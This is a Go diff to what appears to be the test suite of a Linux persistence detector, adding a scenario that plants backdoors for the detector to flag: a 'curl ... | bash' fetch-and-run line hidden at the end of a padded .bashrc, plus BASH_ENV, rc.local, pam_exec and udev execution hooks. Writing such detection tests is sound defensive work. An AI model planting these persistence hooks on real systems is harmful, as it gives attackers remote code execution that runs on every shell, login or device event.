@@ -75,6 +75,8 @@ func init() {
 			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
 			"persist.cron_suspect", "persist.cron_frequent", "persist.at_job",
 			"persist.ssh_forced_command", "persist.sshd_key_source",
+			"persist.shell_startup", "persist.bash_env", "persist.trigger_exec",
+			"persist.pam_exec", "persist.udev_run",
 		},
 		Exit: 0,
 	})
@@ -276,6 +278,8 @@ func init() {
 			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
 			"persist.cron_suspect", "persist.cron_frequent", "persist.at_job",
 			"persist.ssh_forced_command", "persist.sshd_key_source",
+			"persist.shell_startup", "persist.bash_env", "persist.trigger_exec",
+			"persist.pam_exec", "persist.udev_run",
 		},
 		Exit: 0,
 	})
@@ -540,6 +544,36 @@ func init() {
 		},
 		MustBeIncomplete: true,
 		Exit:             2,
+	})
+
+	Register(Scenario{
+		ID:   "64-gatilhos-de-execucao",
+		Desc: "shell startup, BASH_ENV, rc.local, PAM e udev: cada um com o SEU evento",
+		// O que junta arquivos tão diferentes é a mesma pergunta — QUANDO isto
+		// roda. O evento é o que decide qual deles o atacante escolhe, e é o
+		// que o operador precisa para saber o que já rodou desde a invasão.
+		Images: matriz,
+		Plant: `mkdir -p /etc/profile.d /etc/pam.d /etc/udev/rules.d /root
+			# .bashrc realista: a §7.6 fala do arquivo de distro com dezenas de
+			# linhas, porque é o comprimento dele que faz ninguém rolar até o fim
+			i=1; while [ $i -le 20 ]; do printf 'alias l%d="ls -l"\n' $i >> /root/.bashrc; i=$((i+1)); done
+			printf '\n\n' >> /root/.bashrc
+			printf 'curl -s http://198.51.100.7/a | bash\n' >> /root/.bashrc
+			printf 'export BASH_ENV=/tmp/.x\n' >> /root/.profile
+			printf '#!/bin/sh\n/dev/shm/agent &\nexit 0\n' > /etc/rc.local
+			chmod +x /etc/rc.local
+			printf 'auth optional pam_exec.so /tmp/.notify\n' >> /etc/pam.d/sshd
+			printf 'ACTION=="add", RUN+="/tmp/.udev"\n' > /etc/udev/rules.d/99-x.rules
+			sleep 0.2`,
+		Expect: []Expect{
+			{ID: "persist.shell_startup", Sev: "CRITICAL", Evidence: "FIM do arquivo"},
+			// o caminho que quase ninguém confere: roda em script, cron e scp
+			{ID: "persist.bash_env", Sev: "CRITICAL", Evidence: "NÃO interativo"},
+			{ID: "persist.trigger_exec", Sev: "CRITICAL", Subject: "/etc/rc.local"},
+			{ID: "persist.pam_exec", Evidence: "a CADA autenticação"},
+			{ID: "persist.udev_run", Evidence: "evento de dispositivo"},
+		},
+		Exit: 2,
 	})
 
 	// ------------------------------------------------- adversário, não mecanismo
